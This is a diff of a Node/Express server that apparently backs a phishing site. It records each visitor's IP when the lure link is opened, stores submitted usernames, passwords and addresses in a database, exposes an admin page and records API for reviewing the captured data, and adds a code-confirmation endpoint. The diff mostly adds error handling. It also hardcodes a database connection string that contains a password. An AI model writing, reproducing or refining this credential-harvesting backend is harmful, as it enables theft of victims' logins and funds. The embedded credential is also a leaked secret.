@@ -6,11 +6,13 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Supabase Connection
+// === YOUR SUPABASE CONNECTION ===
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
+
+// Create table if not exists
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -19,7 +21,8 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     address TEXT,
     ip TEXT,
     timestamp TEXT
-)`);
+)`).then(() => console.log("✅ Supabase Connected"))
+   .catch(err => console.error("Table Error:", err.message));
 
 function getRealIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
@@ -28,20 +31,24 @@ function getRealIP(req) {
            'Unknown';
 }
 
-function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
+async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    pool.query(
-        "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
-        [type, username, password, address, ip, timestamp]
-    );
-    console.log(`✅ SAVED: ${type} | IP: ${ip}`);
+    
+    try {
+        await pool.query(
+            "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
+            [type, username, password, address, ip, timestamp]
+        );
+        console.log(`✅ SAVED: ${type} | IP: ${ip}`);
+    } catch (err) {
+        console.error("Save Error:", err.message);
+    }
 }
 
-// Record Page Visit Immediately
+// Routes
 app.get('/', (req, res) => {
     const ip = getRealIP(req);
     saveRecord('Page Visit', null, null, null, ip);
-    console.log("🔴 MAIN LINK CLICKED! Real IP:", ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
@@ -59,26 +66,38 @@ app.post('/api/login', (req, res) => {
 });
 
 app.get('/api/records', async (req, res) => {
-    const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
-    res.json(result.rows);
+    try {
+        const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
+        res.json(result.rows);
+    } catch (err) {
+        console.error("Query Error:", err.message);
+        res.json([]);
+    }
 });
 
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
+app.post('/api/confirm-code', async (req, res) => {
+    const { id, status } = req.body;
+    try {
+        await pool.query(
+            "UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2",
+            [status, id]
+        );
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ success: false });
+    }
+});
+
 app.post('/api/clear', async (req, res) => {
     await pool.query("DELETE FROM records");
-    res.json({ message: 'Cleared' });
+    res.json({ message: 'All records cleared' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`🚀 Server running`);
-});
-// Add this route in server.js
-app.post('/api/confirm-code', async (req, res) => {
-    const { id, status } = req.body;
-    await pool.query("UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2", [status, id]);
-    res.json({ success: true });
+    console.log(`🚀 Server running on port ${PORT}`);
 });
